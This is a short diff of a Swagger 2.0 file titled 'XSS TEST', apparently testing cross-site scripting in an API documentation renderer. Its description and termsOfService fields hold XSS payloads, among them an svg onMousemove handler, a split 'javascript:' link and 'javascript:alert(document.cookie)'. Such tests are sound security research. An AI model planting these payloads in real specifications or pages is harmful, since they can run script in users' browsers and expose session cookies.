@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": 
   {"title": "XSS TEST",
-  "description": "</p><svg z/onMousemove='(prompt(1))'><p>",
+  "description": "</p><a href='javas cript:alert(1)'>link test4</a><p>",
   "termsOfService": "javascript:alert(document.cookie)"},
   "contact": 
   {"name": "AHNLAB",
